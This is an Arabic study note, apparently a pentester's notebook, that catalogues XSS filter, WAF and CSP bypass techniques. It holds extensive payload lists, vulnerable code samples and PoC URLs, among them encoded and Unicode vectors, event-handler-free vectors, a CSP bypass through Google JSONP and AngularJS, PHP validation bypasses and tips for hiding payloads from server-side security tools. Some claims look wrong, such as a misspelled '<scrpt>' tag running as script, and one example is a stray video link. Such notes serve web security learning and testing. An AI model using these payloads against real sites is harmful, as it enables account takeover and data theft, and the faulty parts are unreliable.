{ #XSS_with_out_alret / #XSS_DOM  }
##### **الشرح البسيط:**
يُستخدم كبديل لـ `alert` بكتابة محتوى مباشرة في الصفحة باستخدام `document.write` أو `document.writeln`.

##### **أمثلة تعمل:**
- `write`XSSed!``: يكتب نصًا في الصفحة.
- `write`<img/src/oNerror=alert(1)>``: يكتب عنصر HTML يُنفذ XSS.
- `write('\74img/src/o\156error\75alert\501\51\76')`: يكتب عنصر HTML بترميز أوكتال.
- في JavaScript: `document.write('<img/src/oNerror=alert(1)>')`.

##### **لماذا يعمل؟**
- `document.write` مدعوم في جميع المتصفحات.
- يتجاوز مرشحات تمنع `alert` أو `prompt`.
- يسمح بإدراج HTML مع معالجات مثل `onerror`.

##### 📌 **تستخدمها لما:**

- `alert()` مش شغالة أو متقفلة.
    
- وعايز تكتب عنصر HTML في الصفحة ينفذ الكود.
    

##### 🧪 **مثال:**

```js
document.write('<img src=x onerror=alert(1)>')
```

أو حتى كده:

```js
write`<img src=x oNerror=alert(1)>`
```

💡 المتصفح هيعرض الصورة، لكن فيها `onerror=alert(1)`، فهينفذ الكود.


### 🔥 الكود المصاب:

```html
<!-- vulnerable4.html -->
<script>
  var content = "<?= $_GET['x']; ?>";
  document.write(content);
</script>
```

### 💣 PoC:

```
vulnerable4.html?x=<img src=x onerror=alert(1)>
```

### ✅ الحماية:

- استخدم `textContent` بدلاً من `document.write`.
    
- أو عقم المدخلات باستخدام `htmlspecialchars`.

#### شرح للتبسيط

![2025-06-23 18-26-41.mkv](attachments/2025-06-23 18-26-41.mkv)



---
## ✅ ** بديل التنبيه – بروتوكول Open (Alert Alternative – Open Pseudo-Protocol)**
{ #ideas_for_url }
**الشرح البسيط:**
يُستخدم كبديل لـ `alert` بفتح نافذة جديدة باستخدام `top.open` مع بروتوكول `javascript:`.

**أمثلة تعمل:**
- `top.open`javas\cript:al\ert\x281\x29``: يفتح نافذة جديدة ويُنفذ `alert(1)`.
- `top.open`javas\cript:al\ert\x281\x29${0}0``: يعمل في متصفحات Chromium (مثل Chrome) مع إطار `<iframe name=0>`.

**لماذا يعمل؟**
- `top.open` مدعوم في المتصفحات الحديثة.
- يتجاوز مرشحات تمنع `alert` مباشرة.
- الترميز (`\x28` للأقواس) يُضلل المرشحات.

#### 🔥 الكود المصاب:

```html
<!-- vulnerable5.html -->
<button onclick="openWindow()">Open</button>
<script>
  function openWindow() {
    var url = location.hash.substr(1); // يعرض جزء من URL مباشرة
    top.open(url);
  }
</script>
```

### 💣 PoC:

```
vulnerable5.html#javascript:alert(1)
```

#### ✅ الحماية:

- لا تستخدم `top.open()` مع بيانات غير موثوقة.
    
- فلتر أي مدخلات URL باستخدام قائمة بيضاء (whitelist) للروابط المسموح بها.
    


#### شرح للتبسيط
![2025-06-23 18-31-48.mkv](attachments/2025-06-23 18-31-48.mkv)


**الخلاصة:**
بديل `open` باستخدام `top.open`javas\cript:al\ert\x281\x29`` فعال لأنه يفتح نافذة جديدة ويتجاوز مرشحات التنبيه.

-----
## ✅ ** بديل التنبيه – Eval + URL (Alert Alternative – Eval + URL)**
{ #ideas_for_url  }
**الشرح البسيط:**
يُستخدم لتنفيذ كود JavaScript من URL (في المسار بعد `.php` أو في الجزء `#`) باستخدام `eval`.

**أمثلة تعمل:**
- `<svg onload=eval(" ' "+URL)>`: ينفذ الكود من URL مثل `FILE.php/'/alert(1)//` أو `#'/alert(1)`.
- `<svg id=eval onload=top[id](" ' "+URL)>`: يستخدم قيمة `id` بدلاً من `eval`.

**لماذا يعمل؟**
- `eval` ينفذ سلاسل JavaScript مباشرة.
- يستغل انعكاس URL بدون تعقيم.
- يتجاوز مرشحات تحظر `alert` مباشرة.
### 🔥 الكود المصاب:

```html
<!-- vulnerable6.html -->
<svg onload="eval(' ' + location.hash.substr(1))"></svg>
```

### 💣 PoC:

```
vulnerable6.html#'/alert(1)// 
```

### ✅ الحماية:

- لا تستخدم `eval()`.
    
- استبدل بـ `JSON.parse()` أو logic ثابت.
    
- أو اعمل فلترة لأي بيانات تأتي من `location`.

#### شرح للتبسيط


![2025-06-23 18-37-16.mkv](attachments/2025-06-23 18-37-16.mkv)


**الخلاصة:**
بديل `eval + URL` باستخدام `<svg onload=eval(" ' "+URL)>` فعال لأنه ينفذ كود JavaScript من URL غير مُنظف.

---
## **✅ بديل التنبيه – Eval + URL مع نصوص قالبية (Alert Alternative – Eval + URL with Template Literal)**
{ #ideas_for_url  / #XSS_Idea_for_SVG_tag }
**الشرح البسيط:**
يُستخدم لتنفيذ كود JavaScript من URL باستخدام نصوص قالبية و`eval`.

##### **مثال يعمل:**
- `${alert(1)}<svg onload=eval('`//'+URL)>`: ينفذ الكود من URL مثل `#alert(1)`.

##### **لماذا يعمل؟**
- النصوص القالبية (``) تسمح بتنفيذ تعبيرات معقدة.
- `eval` ينفذ الكود من URL.
- يتجاوز مرشحات تحظر الأقواس أو `alert`.

##### 📌 **تستخدمها لما:**

- الكود فيه `eval()` أو `new Function()` وبيسحب من `location.hash` أو `URL`.
    
- الموقع بيمنع `alert()` لكن بيسمح بالنصوص القالبية `${}`.
    

##### 🧪 **مثال URL:**

```url
example.com/page#${alert(1)}
```

##### 🧪 **داخل الصفحة:**

```html
<svg onload=eval(location.hash)>
```

💡 `location.hash` = `#${alert(1)}`  
⏬ بعد فك القالب → ينفذ `alert(1)`

#### شرح للتبسيط

![2025-06-23 19-15-06.mkv](attachments/2025-06-23 19-15-06.mkv)

##### **الخلاصة:**
بديل `eval + URL` مع نصوص قالبية باستخدام `${alert(1)}<svg onload=eval('`//'+URL)>` فعال لأنه يستغل النصوص القالبية وURL.

---

## ** ✅تجاوز استنادًا إلى Strip-Tags (Strip-Tags Based Bypass)**
{ #XSS_with_out_angle_bracket /  #Inline_HTML_Injection }
##### **الشرح البسيط:**
يُستخدم عندما يقوم التطبيق بإزالة كل شيء بين `<` و`>` (مثل دالة PHP `strip_tags()`). يعتمد على حقن داخلي بدون علامات كاملة.

##### **مثال ضمني يعمل:**
- `"onpointerover=alert(1) //`: يُنفذ في خاصية HTML بدون الحاجة إلى علامات مغلقة.

##### **لماذا يعمل؟**
- دالة `strip_tags()` تُزيل العلامات لكن لا تؤثر على الخصائص.
- معالجات مثل `onpointerover` تُنفذ الكود مباشرة.
- يتجاوز مرشحات تعتمد على إزالة العلامات.

##### 📌 **تستخدمها لما:**

- الموقع بيستخدم `strip_tags()` أو حاجة تشيل كل `<tag>`، لكن **ما بتشيلش الخصائص داخل عناصر** زي:
    

```html
<input value="...">
```

##### 🧪 **تقدر تكتب:**

```html
![2025-06-23 19-15-06.mkv](attachments/2025-06-23 19-15-06.mkv)
```

💡 بيشتغل لأن الفلتر بيشيل الوسم بس، مش الكود اللي جواه.

##### **الخلاصة:**
تجاوز Strip-Tags باستخدام `"onpointerover=alert(1) //` فعال لأنه يعمل داخل الخصائص ويتجاوز إزالة العلامات.

---

## ✅ **==القفز إلى جزء URL (Jump to URL Fragment)**==
{ #ideas_for_url }
##### **الشرح البسيط:**
يُستخدم لإخفاء أجزاء من الحمولة في جزء URL (بعد `#`) لتجنب اكتشاف WAF، ثم يُنفذ الكود باستخدام `eval` أو `document.write`.

##### **أمثلة تعمل:**
- `eval(URL.slice(-8)) #alert(1)`: ينفذ `alert(1)` من جزء URL.
- `eval(location.hash.slice(1)) #alert(1)`: نفس الفكرة باستخدام `location.hash`.
- `document.write(decodeURI(location.hash)) #<img/src/onerror=alert(1)>`: يكتب HTML من جزء URL.

##### **لماذا يعمل؟**
- جزء URL (بعد `#`) لا يُرسل إلى الخادم، لذا يتجاوز WAF.
- `eval` و`document.write` ينفذان الكود مباشرة.
- يسمح بإخفاء الحمولة من المرشحات.

##### 📌 **تستخدمها لما:**

- الكود يستخدم `location.hash` أو `URL.split()` في JS.
    
- وبتحتاج تخبي كودك من WAF (لأن `#` مش بيروح للسيرفر).
    

##### 🧪 **أمثلة:**

```url
example.com/page#alert(1)
```

##### 🧪 **داخل الصفحة:**

```js
eval(location.hash.slice(1))
```

أو:

```js
document.write(decodeURI(location.hash))
```

💡 دي طريقة ممتازة لإخفاء حمولة XSS **من أدوات الأمن على السيرفر**.

##### **الخلاصة:**
القفز إلى جزء URL باستخدام `eval(location.hash.slice(1)) #alert(1)` فعال لأنه يُخفي الحمولة في جزء URL ويتجاوز WAF.

---
### ** حقن XSS من الدرجة الثانية (Second Order XSS Injection)**
{  #XSS_Idea_for_SVG_tag  }
**الشرح البسيط:**
يُستخدم عندما تُخزن البيانات في قاعدة بيانات أو تُعالج مرتين (مثل تخزينها ثم استرجاعها لاحقًا أو إدراجها في DOM). يمكنك إدخال كود XSS يُنفذ عند الاستخدام الثاني.

**مثال يعمل:**
- `<svg/onload=alert(1)>`: يُخزن في قاعدة البيانات ويُنفذ عند استرجاعه في الصفحة.

**لماذا يعمل؟**
- التطبيقات قد تُنظف المدخلات عند الإدخال لكن لا تتحقق عند الاسترجاع.
- `<svg onload=alert(1)>` مدعوم في المتصفحات الحديثة ويُنفذ تلقائيًا.
- يُنتج XSS مخزن (Stored XSS) يؤثر على المستخدمين الآخرين.

**📌 استخدمها لما:**

- البيانات تُخزن في قاعدة البيانات.
    
- الهجوم ما بيحصلش وقت الإدخال، لكن عند العرض في صفحة أخرى (مثل الـ Profile، أو Dashboard).
    

🧪 **مثال واقعي:**

- تسجل في الموقع باسم: `<svg/onload=alert(1)>`
    
- لما Admin يفتح صفحتك، الكود يُنفذ.
    

**الخلاصة:**
حقن XSS من الدرجة الثانية باستخدام `<svg/onload=alert(1)>` فعال لأنه يستغل معالجة البيانات مرتين ويُنفذ عند الاسترجاع.

---

### ** تجاوز مدقق الإملاء في PHP (PHP Spell Checker Bypass)**
{ #XSS_Idea_for_script_tag }
**الشرح البسيط:**
يُستخدم لتجاوز دالة PHP `pspell_new` التي تُستخدم في ميزة "هل تقصد" (مثل Google) في حقول البحث. يمكنك إدخال كود XSS يُشبه كلمة خطأ إملائي.

**مثال يعمل:**
- `<scrpt>confirm(1)</scrpt>`: يُدخل كود مشابه لـ `<script>` لكن بحرف خاطئ (`scrpt`)، يُنفذ عند عرض الاقتراح.

**لماذا يعمل؟**
- مدقق الإملاء قد يعكس المدخلات بدون تعقيم.
- `<scrpt>` يُفسر كـ `<script>` في المتصفحات الحديثة.
- يتجاوز مرشحات تبحث عن `<script>` القياسي.

**📌 استخدمها لما:**

- الموقع فيه ميزة "هل كنت تقصد...؟"
    
- وإنت بتدخل كلمة خاطئة، وهو بيرد عليك بإعادة الكلمة المقترحة.
    

🧪 **مثال:**

```html
<scrpt>confirm(1)</scrpt>
```

**الخلاصة:**
تجاوز مدقق الإملاء باستخدام `<scrpt>confirm(1)</scrpt>` فعال لأنه يستغل انعكاس المدخلات غير المُنظفة في ميزة "هل تقصد".

---
###  تجاوز سياسة أمان المحتوى (CSP Bypass for Whitelisted Google Domains)**
{ #XSS_other_idea }
**الشرح البسيط:**
يُستخدم عندما تسمح سياسة CSP بمجالات Google الموثوقة. يمكنك استخدام خدمات Google لتنفيذ JavaScript أو AngularJS.

**أمثلة تعمل:**
- `<script src=//www.google.com/complete/search?client=chrome%26jsonp=alert(1)></script>`: يستغل ميزة البحث التلقائي لتنفيذ `alert(1)`.
- `<script src=//www.googleapis.com/customsearch/v1?callback=alert(1)></script>`: يستغل البحث المخصص.
- `<script src=//ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js></script><x ng-app ng-csp>{{$new.constructor('alert(1)')()}}`: يُحمل AngularJS ويُنفذ XSS.

**لماذا يعمل؟**
- CSP قد تسمح بـ `*.google.com` أو `*.googleapis.com`.
- خدمات Google مثل البحث تدعم استدعاءات JSONP التي تُنفذ JavaScript.
- AngularJS يُنفذ XSS إذا كان `ng-csp` غير مُفعل بشكل صحيح.
ns

**📌 استخدمها لما:**

- الصفحة عندها Content-Security-Policy.
    
- لكن بتسمح بـ `*.google.com` أو `ajax.googleapis.com`.
    

🧪 **مثال:**

```html
<script src="//www.google.com/complete/search?client=chrome&jsonp=alert(1)"></script>
```

**الخلاصة:**
تجاوز CSP باستخدام `<script src=//www.google.com/complete/search?...>` أو AngularJS فعال لأنه يستغل مجالات Google الموثوقة.

---

### ** ناقلات SVG مع معالجات الأحداث (SVG Vectors with Event Handlers)**
{ #XSS--ALL--Event--Payload }
**الشرح البسيط:**
يُستخدم في متصفحات Firefox وChromium (مع تعديل) لتنفيذ XSS باستخدام عناصر SVG ومعالجات أحداث مثل `onbegin` أو `onend`.

**أمثلة تعمل:**
- `<svg><set onbegin=alert(1)>`: يُنفذ عند بدء الرسوم المتحركة (يعمل في Firefox).
- `<svg><set end=1 onend=alert(1)>`: يُنفذ عند انتهاء الرسوم (يعمل في Firefox).
- `<svg><set attributename=x onbegin=alert(1)>`: يعمل في Chromium بإضافة `attributename=x`.

**لماذا يعمل؟**
- `<set>` و`animate` مدعومان في SVG للرسوم المتحركة.
- معالجات مثل `onbegin` و`onend` قليلًا ما تُحظر.
- إضافة `attributename=x` تجعل الحمولة تعمل في Chrome.

**📌 استخدمها لما:**

- الوسوم العادية محظورة (`<script>`، `<img>`...).
    
- لكن `<svg>` مش محظور.
    
- ومعالجات زي `onbegin`, `onend` مسموحة.
    

🧪 **مثال:**

```html
<svg><set onbegin=alert(1)></svg>
```

**الخلاصة:**
ناقلات SVG مع معالجات مثل `<svg><set onbegin=alert(1)>` فعالة لأنها تستغل ميزات SVG وتتجاوز مرشحات الأحداث.

---

### ** ناقلات SVG بدون معالجات أحداث (SVG Vectors without Event Handlers)**
{ #XSS--ALL--Event--Payload  /  #ideas_for_url }
**الشرح البسيط:**
يُستخدم لتجاوز المرشحات التي تمنع معالجات الأحداث أو خصائص مثل `src` و`data`. يعتمد على عنصر `<animate>` أو `<use>` لتنفيذ XSS.

**أمثلة تعمل:**
- `<svg><a><rect width=99% height=99% /><animate attributeName=href to=javascript:alert(1)>`: يُنفذ عند النقر على الرابط.
- `<svg><a><rect width=99% height=99% /><animate attributeName=href values=javascript:alert(1)>`: مشابه للأول.
- `<svg><a><rect width=99% height=99% /><animate attributeName=href to=0 from=javascript:alert(1)>`: يُنفذ عند الرسوم.
- `<svg><use xlink:href=data:image/svg+xml;base64,PHN2ZyBpZD0ieCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI+PGVtYmVkIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIiBzcmM9ImphdmFzY3JpcHQ6YWxlcnQoMSkiLz48L3N2Zz4=%23x>`: يُنفذ في Firefox عبر `<use>`.

**لماذا يعمل؟**
- `<animate>` يُغيّر خصائص مثل `href` إلى `javascript:alert(1)` بدون معالجات أحداث.
- `<use>` يُحمل SVG خارجي يحتوي على `<embed>` مع `javascript:`.
- يتجاوز مرشحات تبحث عن `on*` أو `src`.

**📌 استخدمها لما:**

- `on*` كلها محظورة.
    
- لكن `animate` أو `use` غير محظورين.
    
- وأحيانًا متصفحك هو اللي ينفذ الكود (Firefox أفضل في ده).
    

🧪 **مثال:**

```html
<svg><a><animate attributeName=href to=javascript:alert(1)></svg>
```

**الخلاصة:**
ناقلات SVG بدون معالجات مثل `<svg><a><animate attributeName=href to=javascript:alert(1)>` فعالة لأنها تستخدم `<animate>` و`<use>` لتجاوز مرشحات الأحداث.

---

### ** ناقلات بدون معالجات أحداث (Vectors without Event Handlers)**
{ #XSS--ALL--Event--Payload  /  #ideas_for_url }
**الشرح البسيط:**
يُستخدم عندما تمنع المرشحات معالجات الأحداث. تعتمد على علامات HTML أو بروتوكولات مثل `javascript:` و`data:`، بعضها يتطلب تفاعل المستخدم.

**أمثلة تعمل:**
- `<script>alert(1)</script>`: يُنفذ JavaScript مباشرة.
- `<script src=data:,alert(1)>`: يُنفذ عبر بروتوكول `data:`.
- `<iframe src=javascript:alert(1)>`: يُنفذ عبر إطار.
- `<embed src=javascript:alert(1)>`: يُنفذ عبر عنصر `<embed>`.
- `<a href=javascript:alert(1)>click`: يُنفذ عند النقر.
- `<math><brute href=javascript:alert(1)>click`: يُنفذ عبر `<math>`.
- `<form action=javascript:alert(1)><input type=submit>`: يُنفذ عند إرسال النموذج.
- `<form><button formaction=javascript:alert(1)>click`: يُنفذ عند النقر.
- `<object data=javascript:alert(1)>`: يُنفذ عبر `<object>`.
- `<iframe srcdoc=<svg/onload=alert(1)>>`: يُنفذ عبر محتوى `<iframe>`.
- `<svg><script xlink:href=data:,alert(1) />`: يُنفذ عبر SVG.

**لماذا يعمل؟**
- بروتوكولات مثل `javascript:` و`data:` مدعومة في المتصفحات.
- علامات مثل `<iframe>`، `<embed>`، و`<form>` تسمح بتنفيذ JavaScript.
- يتجاوز مرشحات تحظر معالجات الأحداث.

**📌 استخدمها لما:**

- `onerror`, `onclick` وكل الـ `on*` مرفوضين.
    
- وبتحتاج حمولة ما فيهاش `on`.
    

🧪 **مثال قوي جدًا:**

```html
<script src="data:,alert(1)"></script>
<iframe src="javascript:alert(1)"></iframe>
<a href="javascript:alert(1)">click</a>
```

**الخلاصة:**
ناقلات بدون معالجات مثل `<script src=data:,alert(1)>` و`<a href=javascript:alert(1)>click` فعالة لأنها تستخدم بروتوكولات وعلامات HTML مدعومة.

##### كل البايلود في الفكره دي 
```javascript
 <script>alert(1)</script> 
<script src=data:,alert(1)> 
<iframe src=javascript:alert(1)> 
<embed src=javascript:alert(1)>
<a href=javascript:alert(1)>click
<math><brute href=javascript:alert(1)>click
<form action=javascript:alert(1)><input type=submit>
<isindex action=javascript:alert(1) type=submit value=click>
<form><button formaction=javascript:alert(1)>click
<form><input formaction=javascript:alert(1) type=submit value=click> 
<form><input formaction=javascript:alert(1) type=image value=click> 
<form><input formaction=javascript:alert(1) type=image src=SOURCE> 
<isindex formaction=javascript:alert(1) type=submit value=click> 
<object data=javascript:alert(1)> 
<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;> 
<svg><script xlink:href=data:,alert(1) />
<math><brute xlink:href=javascript:alert(1)>click
```
---

### ** ناقلات مع معالجات أحداث غير محددة (Vectors with Agnostic Event Handlers)**
{ #XSS--ALL--Event--Payload / #XSS_unique_tags  }
**الشرح البسيط:**
يُستخدم عندما تمنع المرشحات أسماء علامات HTML معروفة. يمكنك استخدام علامات مخصصة (مثل `<x>`) مع معالجات أحداث تتطلب تفاعل المستخدم.

**أمثلة تعمل:**
- `<x contenteditable onblur=alert(1)>lose focus!`: يُنفذ عند فقدان التركيز.
- `<x onclick=alert(1)>click this!`: يُنفذ عند النقر.
- `<x oncopy=alert(1)>copy this!`: يُنفذ عند النسخ.
- `<x oncontextmenu=alert(1)>right click this!`: يُنفذ عند النقر الأيمن.
- `<x onmouseover=alert(1)>hover this!`: يُنفذ عند تمرير الفأرة.
- `<x contenteditable oninput=alert(1)>input here!`: يُنفذ عند الكتابة.
- `<x onpointerover=alert(1)>hover this!`: يُنفذ عند تمرير المؤشر.

**لماذا يعمل؟**
- العلامات المخصصة مثل `<x>` لا تُحظر غالبًا.
- معالجات مثل `onblur`، `onclick`، و`onpointerover` مدعومة وقليلًا ما تُحظر.
- تتطلب تفاعل المستخدم لكنها فعالة في سياقات DOM.

**📌 استخدمها لما:**

- كل الوسوم التقليدية محظورة (`<img>`, `<svg>`, `<script>`).
    
- تقدر تستخدم وسوم غير قياسية زي `<x>` أو `<a>` داخلي.
    
- والمعالجة بتعتمد على **تفاعل المستخدم**.
    

🧪 **مثال:**

```html
<x contenteditable onblur=alert(1)>click then unfocus</x>
```

**الخلاصة:**
ناقلات مع معالجات غير محددة مثل `<x onmouseover=alert(1)>hover this!` فعالة لأنها تستخدم علامات مخصصة ومعالجات متنوعة.

##### كل البايلود في الفكره دي 

```javascript
 <x contenteditable onblur=alert(1)>lose focus!
<x onclick=alert(1)>click this!
 <x oncopy=alert(1)>copy this!
<x oncontextmenu=alert(1)>>right click this!
<x onauxclick=alert(1)>>right click this!
 <x oncut=alert(1)>>copy this!
<x ondblclick=alert(1)>double click this!
<x ondrag=alert(1)>drag this!
<x contenteditable onfocus=alert(1)>focus this!
<x contenteditable oninput=alert(1)>input here!
<x contenteditable onkeydown=alert(1)>press any key!
<x contenteditable onkeypress=alert(1)>press any key!
<x contenteditable onkeyup=alert(1)>press any key!
<x onmousedown=alert(1)>click this!
<x onmouseenter=alert(1)>hover this
<x onmousemove=alert(1)>hover this!
<x onmouseout=alert(1)>hover this! 
<x onmouseover=alert(1)>hover this! 
<x onmouseup=alert(1)>click this! 
<x contenteditable onpaste=alert(1)>paste here!
<x onpointercancel=alert(1)>hover this! 
<x onpointerdown=alert(1)>hover this!
 <x onpointerenter=alert(1)>hover this!
 <x onpointerleave=alert(1)>hover this!
<x onpointermove=alert(1)>hover this!
 <x onpointerout=alert(1)>hover this! 
<x onpointerover=alert(1)>hover this!
<x onpointerup=alert(1)>hover this! 
 <x onpointerrawupdate=alert(1)>hover this!
```

---

### ==**1. تجاوز انعكاس السياق المختلط (Mixed Context Reflection Entity Bypass)**==
{  #XSS_Idea_for_script_tag  / #XSS_Idea_for_SVG_tag / #Inline_HTML_Injection }
**الشرح البسيط:**
يُستخدم عندما تُعكس البيانات في سياقين (HTML وJavaScript) بالترتيب، وتكون قريبة من بعضها. يُستغل `<svg>` لتحويل الكود المُنظف (مثل ترميز علامات الاقتباس) إلى JavaScript صالح، مما يُنفذ `alert(1)`.

**أمثلة تعمل:**
- `">'alert(1)-'<svg>`: لعلامات اقتباس مفردة مُنظفة (مثل `'` تصبح `&#39;`).
- `">'alert(1)-'<svg>`: لعلامات اقتباس مفردة مُهربة بالكامل (مثل `\'`).
- `">alert(1)-"<svg>`: لعلامات اقتباس مزدوجة مُنظفة (مثل `"` تصبح `&quot;`).
- `"">alert(1)-"<svg>`: لعلامات اقتباس مزدوجة مُهربة بالكامل (مثل `\"`).

**لماذا يعمل؟**
- `<svg>` يُجبر المتصفح على تحليل الكود التالي بشكل يسمح بتنفيذ JavaScript حتى مع الترميز.
- الانعكاس في سياقين (HTML ثم JavaScript) يُنشئ سياقًا معقدًا يُصعب تصفيته.
- يتجاوز مرشحات تعقيم علامات الاقتباس.

### ✅ الكود المصاب:

```html
<script>
  var name = '{{USER_INPUT}}';
</script>
```

### 🔍 الاكتشاف:

- ابحث عن القيم التي تُعكس داخل **سياق JavaScript** مباشرة (مثل داخل متغير).
    
- وفي نفس الوقت تكون داخل صفحة HTML، أي أن الإدخال ينعكس مرتين: في JavaScript و HTML.
    
- جرّب payload مثل:
    
    ```html
    ">'-alert(1)-'<svg>
    ```
    

**الخلاصة:**
تجاوز السياق المختلط باستخدام `">'alert(1)-'<svg>` فعال لأنه يستغل انعكاس HTML وJavaScript مع `<svg>` لتجاوز تعقيم الاقتباسات.

---

## **2. ناقل Strip-My-Script (Strip-My-Script Vector)**
{ #XSS_Idea_for_script_tag }
**الشرح البسيط:**
يُستخدم لتضليل المرشحات التي تُزيل `<script>` الكلاسيكي. يُدرج `<script>` داخل `<svg>` بحيث يظل الكود صالحًا حتى لو أُزيل `<script>`.

**مثال يعمل:**
- `<svg/on<script><script>load=alert(1)//</script>`: يُنفذ `alert(1)` عبر `<svg>` حتى لو أُزيل `<script>`.

**لماذا يعمل؟**
- إذا أُزيل `<script>`، يظل `<svg onload=alert(1)>` صالحًا.
- `<svg>` مدعوم في المتصفحات الحديثة.
- يتجاوز مرشحات تبحث عن `<script>` فقط.

**الخلاصة:**
ناقل Strip-My-Script باستخدام `<svg/on<script><script>load=alert(1)//` فعال لأنه يتجاوز إزالة `<script>` باستخدام `<svg>`.

---

## **3. تعليقات JavaScript بديلة (Javascript Alternative Comments)**
{ #XSS_ecoded_payload }
**الشرح البسيط:**
يُستخدم عندما تمنع أو تُزيل المرشحات تعليقات JavaScript العادية (`//`). يُستبدل بتعليقات HTML أو فواصل أسطر.

**أمثلة تعمل:**
- `<!-%0A-->`: يُستخدم كتعليق بديل في JavaScript.

**لماذا يعمل؟**
- تعليقات HTML (`<!-- -->`) تُفسر كتعليقات في JavaScript.
- `%0A` (فاصل سطر) يُنهي السطر دون الحاجة إلى `//`.
- يتجاوز مرشحات تحظر `//`.

**الخلاصة:**
تعليقات بديلة باستخدام `<!-%0A-->` فعالة لأنها تُستخدم كبديل لـ `//` وتتجاوز المرشحات.

---

## **4. إدخال JavaScript بأحرف صغيرة (JS Lowercased Input)**
{ #XSS_Idea_for_script_tag }
**الشرح البسيط:**
يُستخدم عندما يُحول التطبيق المدخلات إلى أحرف صغيرة (سواء من طرف العميل أو الخادم). يُستخدم حرف الـ İ (نقطة فوق) لتضليل التحويل.

**أمثلة تعمل:**
- `<SCRİPT>alert(1)</SCRİPT>`: يستخدم `İ` بدلاً من `I`، يُفسر كـ `<script>` بعد التحويل.
- `<SCRİPT/SRC=data:,alert(1)>`: يُنفذ عبر `data:`.

**لماذا يعمل؟**
- حرف `İ` يُحول إلى `i` صغيرة، لكن المتصفح يُفسر `<SCRİPT>` كـ `<script>`.
- يتجاوز مرشحات التحويل إلى أحرف صغيرة.
- بروتوكول `data:` مدعوم وقليلًا ما يُحظر.

**الخلاصة:**
إدخال بأحرف صغيرة باستخدام `<SCRİPT>alert(1)</SCRİPT>` فعال لأنه يتجاوز تحويل الأحرف باستخدام `İ`.

---

## **5. UTF-8 طويل جدًا (Overlong UTF-8)**
{ #XSS_ecoded_payload }
**الشرح البسيط:**
يُستخدم عندما يقوم التطبيق بتطبيق Best-Fit Mapping على ترميز UTF-8، مما يسمح بإدخال كود XSS بترميز طويل.

**مثال يعمل:**
- `%CA%BA>%EF%BC%9Csvg/onload%EF%BC%9Dalert%EF%BC%881)>`: يُرمز `<svg onload=alert(1)>` بترميز UTF-8 طويل.

**لماذا يعمل؟**
- الترميز الطويل يُضلل المرشحات التي لا تُعيد فك الترميز بشكل صحيح.
- `<svg onload=alert(1)>` يُنفذ بعد فك الترميز.
- يتجاوز WAF التي لا تتحقق من UTF-8 الطويل.

**الخلاصة:**
ترميز UTF-8 الطويل باستخدام `%EF%BC%9Csvg/onload%EF%BC%9Dalert%EF%BC%881)>` فعال لأنه يتجاوز مرشحات الترميز.

---

## **6. ناقلات حصرية لصفحات ASP (Vectors Exclusive for ASP Pages)**
{ #XSS_ecoded_payload }
**الشرح البسيط:**
يُستخدم لتجاوز مرشحات `<[alpha]` في صفحات ASP باستخدام ترميز Unicode لعلامة `<`.

**أمثلة تعمل:**
- `%u003Csvg onload=alert(1)>`: يُرمز `<` إلى `\u003C`.
- `%u3008svg onload=alert(2)>`: يستخدم رمز Unicode آخر لـ `<`.
- `%uFF1Csvg onload=alert(3)>`: يستخدم رمز Unicode مختلف.

**لماذا يعمل؟**
- ترميز Unicode يُضلل مرشحات `<` في ASP.
- `<svg onload=alert(1)>` يُنفذ بعد فك الترميز.
- يتجاوز مرشحات الحروف الأبجدية بعد `<`.

### ✅ الكود المصاب:

```asp
Response.Write(Request.QueryString("name"))
```

### 🔍 الاكتشاف:

- ابحث عن صفحات ASP تقبل إدخال من المستخدم دون ترميز صحيح.
    
- جرب:
    
    ```
    %u003Csvg onload=alert(1)>
    ```
    

**الخلاصة:**
ناقلات ASP باستخدام `%u003Csvg onload=alert(1)>` فعالة لأنها تستخدم ترميز Unicode لتجاوز مرشحات `<`.

---

## **7. تجاوز التحقق من البريد الإلكتروني في PHP (PHP Email Validation Bypass)**
{ #XSS_other_idea }
**الشرح البسيط:**
يُستخدم لتجاوز دالة PHP `filter_var()` مع `FILTER_VALIDATE_EMAIL` بإدخال بريد إلكتروني يحتوي على XSS.

**مثال يعمل:**
- `"><svg/onload=alert(1)>"@x.y`: يُعتبر بريدًا صالحًا لكنه يُنفذ `<svg onload=alert(1)>`.

**لماذا يعمل؟**
- `filter_var()` قد تقبل تنسيقات بريد غير قياسية.
- `<svg onload=alert(1)>` يُنفذ عند انعكاس المدخلات.
- يتجاوز مرشحات التحقق من البريد.

### ✅ الكود المصاب:

```php
if(filter_var($_POST['email'], FILTER_VALIDATE_EMAIL)) {
    echo $_POST['email'];
}
```

### 🔍 الاكتشاف:

- جرب بريد مثل:
    
    ```
    "><svg/onload=alert(1)>"@x.y
    ```
  
**الخلاصة:**
تجاوز تحقق البريد باستخدام `"><svg/onload=alert(1)>"@x.y` فعال لأنه يُضمن XSS في بريد مقبول.

---

## **8. تجاوز التحقق من URL في PHP (PHP URL Validation Bypass)**
{ #ideas_for_url / #XSS_ecoded_payload  }
**الشرح البسيط:**
يُستخدم لتجاوز دالة PHP `filter_var()` مع `FILTER_VALIDATE_URL` (مع أو بدون `FILTER_FLAG_QUERY_REQUIRED`) بإدخال URL يحتوي على XSS.

**أمثلة تعمل:**
- `javascript://%250Aalert(1)`: يُعتبر URL صالحًا ويُنفذ `alert(1)`.
- `javascript://%250Aalert(1)//?1`: يتطلب استعلامًا.
- `javascript://%250A1?alert(1):0`: يستخدم شرطًا لتنفيذ `alert(1)`.
- `javascript://https://DOMAIN/%250A1?alert(1):0`: مع مرشح نطاق.

**لماذا يعمل؟**
- `javascript:` يُعتبر بروتوكول صالح في بعض الحالات.
- `%0A` (فاصل سطر) يُضلل التحقق.
- يتجاوز مرشحات URL بإدخال JavaScript.

### ✅ الكود المصاب:

```php
if(filter_var($_GET['url'], FILTER_VALIDATE_URL)) {
    echo "<a href='{$_GET['url']}'>Link</a>";
}
```

### 🔍 الاكتشاف:

- جرب:
    
    ```
    javascript://%250Aalert(1)
    ```
    
**الخلاصة:**
تجاوز تحقق URL باستخدام `javascript://%250Aalert(1)` فعال لأنه يُضمن XSS في URL مقبول.

---

## **9. إدراج DOM عبر انعكاس من الخادم (DOM Insertion via Server Side Reflection)**
